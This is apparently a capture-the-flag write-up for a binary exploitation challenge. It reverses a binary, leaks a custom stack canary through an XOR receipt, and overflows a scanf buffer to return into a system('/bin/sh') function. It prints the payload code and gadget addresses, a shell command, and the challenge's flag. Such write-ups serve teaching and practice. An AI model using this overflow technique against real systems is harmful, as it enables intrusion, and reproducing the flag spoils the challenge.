# Canary Notes

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Binary Exploitation |
| Difficulty | Easy |
| Points | 100 |
| Author | 櫛風 |
| Connection | `nc chal.thjcc.org 11038` |
| Handout | [`artifacts/chall.zip`](artifacts/chall.zip) |
| Solver | [`solve.py`](solve.py) |
| Flag | `THJCC{y0u_k1ll3d_c4n4ry_y0u_b4d_b4d}` |

## Overview

Canary Notes implements its own stack guard instead of using the compiler's
stack-protector machinery. At startup, it generates an eight-byte printable
token, stores one copy globally, and places another copy immediately after an
eight-byte note buffer on the stack.

The note input is read with an unbounded `scanf("%s", note)`, so it can overflow
the buffer, the custom canary, the saved frame pointer, and the return address.
The obvious obstacle is that the program compares the local canary with the
global copy before returning.

The receipt feature defeats that protection. For every note, the service
prints:

```text
receipt = first_8_bytes(note) XOR canary
```

A seven-byte known note leaves the canary intact while making all eight bytes
of the receipt plaintext known. XORing that value with the receipt recovers the
complete canary. The second note restores the canary and overwrites the return
address with a short chain into the binary's existing `system("/bin/sh")`
function.

## 1. Inspecting the Handout

The challenge archive contains:

```text
Dockerfile
docker-compose.yml
flag.txt
chal
```

The original archive has SHA-256:

```text
bb11244d22be403bfea86b5468b3a0868eda8d5f1001dde27a00292fafd374ce
```

`chal` is a stripped, dynamically linked x86-64 ELF. Static triage gives the
following hardening profile:

| Mitigation | State |
| --- | --- |
| PIE | Disabled |
| NX | Enabled |
| Stack canary | Disabled |
| RELRO | Partial |

The reported stack-canary state is not a mistake. There is no compiler-generated
guard or `__stack_chk_fail` import. The challenge implements a weaker custom
check in ordinary C code.

The imported functions include:

```text
_exit
puts
setbuf
system
printf
memset
perror
__isoc99_scanf
getrandom
```

The strings reveal the program's two-note flow and a likely win function:

```text
/bin/sh
receipt: 0x%016lx
Welcome to Canary Notes
leave a note:
leave another note:
tampered.
thanks!
```

## 2. Finding the Main Functions

Although symbols are stripped, `_start` passes `0x401299` to
`__libc_start_main`, identifying `main`. Three nearby helper functions are
relevant:

| Address | Purpose |
| --- | --- |
| `0x4011a6` | Generate the custom canary |
| `0x401246` | Call `system("/bin/sh")` |
| `0x40125c` | Print an XOR receipt |

The function at `0x401246` is the exploitation target:

```asm
0x401246  push rbp
0x401247  mov  rbp, rsp
0x40124a  lea  rax, [0x40200e]    ; "/bin/sh"
0x401251  mov  rdi, rax
0x401254  call system
0x401259  nop
0x40125a  pop  rbp
0x40125b  ret
```

Since the executable is not PIE, this address is fixed on every run.

## 3. Reversing the Custom Canary Generator

The generator calls `getrandom` to fill eight bytes:

```asm
lea  rax, [rbp-0x18]
mov  edx, 0
mov  esi, 8
mov  rdi, rax
call getrandom
cmp  rax, 8
```

It then transforms each random byte into the printable ASCII range. The
compiler emits an optimized remainder calculation, but its effect is:

```c
for (int i = 0; i < 8; i++) {
    token[i] = (token[i] % 94) + 0x21;
}
```

Every token byte is therefore between `0x21` (`!`) and `0x7e` (`~`). This has
two useful consequences:

- the token contains no null bytes;
- the token contains no whitespace that would terminate a `%s` conversion.

The generator returns the resulting eight-byte value. `main` saves it globally
at `0x404090` and copies it to the local variable at `rbp-0x8`:

```asm
call 0x4011a6
mov  qword [0x404090], rax
mov  rax, qword [0x404090]
mov  qword [rbp-0x8], rax
```

## 4. Reversing the Receipt Function

The receipt helper receives the canary in `rdi` and a pointer to the note in
`rsi`. Its core operation is:

```asm
mov  rax, qword [rsi]        ; first eight bytes of note
xor  rax, rdi                ; XOR with canary
mov  rsi, rax
lea  rdi, [0x402016]         ; "receipt: 0x%016lx\n"
call printf
```

In C-like pseudocode:

```c
void print_receipt(uint64_t canary, unsigned char *note) {
    uint64_t block = *(uint64_t *)note;
    printf("receipt: 0x%016lx\n", block ^ canary);
}
```

XOR is reversible. If `R` is the printed receipt, `P` is the known note block,
and `C` is the canary:

```text
R = P XOR C
C = R XOR P
```

The receipt is therefore a full canary disclosure whenever we know the first
eight note bytes.

## 5. Understanding the Vulnerable Stack Frame

`main` reserves `0x10` bytes of local stack space:

```asm
0x401299  push rbp
0x40129a  mov  rbp, rsp
0x40129d  sub  rsp, 0x10
```

The local note buffer and custom canary are adjacent:

```text
lower addresses

rbp - 0x10  +---------------------------+
            | note[0..7]                | 8 bytes
rbp - 0x08  +---------------------------+
            | custom canary             | 8 bytes
rbp         +---------------------------+
            | saved rbp                 | 8 bytes
rbp + 0x08  +---------------------------+
            | saved return address      | 8 bytes
rbp + 0x10  +---------------------------+

higher addresses
```

Before the first input, the program clears only the eight-byte note buffer:

```asm
lea  rax, [rbp-0x10]
mov  edx, 8
mov  esi, 0
mov  rdi, rax
call memset
```

Both notes are then read with the same unsafe conversion:

```asm
lea  rsi, [rbp-0x10]
lea  rdi, [0x40204f]          ; "%s"
call __isoc99_scanf
```

There is no field width such as `%8s`. Consequently, either note can overwrite
the complete stack frame.

After the second receipt, `main` performs its custom integrity check:

```asm
mov  rax, qword [0x404090]
cmp  qword [rbp-0x8], rax
je   valid

puts("tampered.")
_exit(1)
```

To reach the overwritten return address, the exploit must restore the exact
canary value at `rbp-0x8`.

## 6. Leaking the Canary Without Corrupting It

An eight-character first note would not be safe. `%s` always appends a null
terminator, so eight data bytes would place that terminator at `rbp-0x8` and
destroy the canary's least significant byte before the receipt is printed.

Instead, the exploit sends exactly seven `A` bytes:

```python
first_note = b"A" * 7
io.sendline(first_note)
```

`scanf` writes seven `A` bytes followed by its terminator inside the buffer:

```text
41 41 41 41 41 41 41 00
```

The complete 64-bit plaintext block is known, while the adjacent canary remains
untouched:

```python
known_plaintext = u64(b"A" * 7 + b"\0")
canary = receipt ^ known_plaintext
```

For example, one remote run disclosed:

```text
receipt = 0x35187c3966360018
canary  = 0x35593d7827774159
```

The canary changes between processes because it comes from `getrandom`; the
calculation is performed dynamically on every connection.

## 7. Building the Second Note

The second input needs to fill the buffer, restore the canary, cross the saved
frame pointer, and control the return address:

```python
payload = (
    b"B" * 8
    + p64(canary)
    + b"C" * 8
    + p64(RET)
    + p64(WIN)
)
```

The fields are:

| Offset | Size | Value | Purpose |
| ---: | ---: | --- | --- |
| `0x00` | 8 | `BBBBBBBB` | Fill the note buffer |
| `0x08` | 8 | leaked canary | Pass the custom check |
| `0x10` | 8 | `CCCCCCCC` | Replace saved `rbp` |
| `0x18` | 8 | `0x401016` | Single `ret` alignment gadget |
| `0x20` | 8 | `0x401246` | Enter the shell function |

The fixed gadget at `0x401016` contains only `ret`:

```asm
0x401016  ret
```

It consumes one extra stack word before entering the win function. This
restores the System V AMD64 stack alignment expected by the subsequent call to
`system`; returning directly to `0x401246` can leave the stack misaligned on
libc paths that use aligned SIMD instructions.

Although the packed addresses contain null bytes, they can still be sent over
the raw TCP connection. Glibc's `%s` scanner stops at whitespace, not at null
bytes read from the input stream. It copies those bytes into memory and adds
its own terminator after the complete whitespace-delimited field.

## 8. Getting the Flag

The Dockerfile runs `chal` behind `socat`, so the shell inherits the same
network connection as standard input and output. The solver queues a command
immediately after the overflow:

```python
io.sendline(payload)
io.sendline(b"cat flag.txt; exit")
```

The program prints the second receipt, verifies the restored canary, prints
`thanks!`, and returns through the two-address chain. `/bin/sh` then consumes
the queued command and returns the flag.

## 9. Running the Solver

The provided solver uses only Python's standard library:

```bash
python3 solve.py
```

The target can be changed through environment variables:

```bash
HOST=chal.thjcc.org PORT=11038 python3 solve.py
```

A successful run displays the dynamic leak and the final response:

```text
[+] receipt = 0x35187c3966360018
[+] canary  = 0x35593d7827774159
receipt: 0x771b7f3a6535031b
thanks!
THJCC{y0u_k1ll3d_c4n4ry_y0u_b4d_b4d}
```

## Flag

```text
THJCC{y0u_k1ll3d_c4n4ry_y0u_b4d_b4d}
```
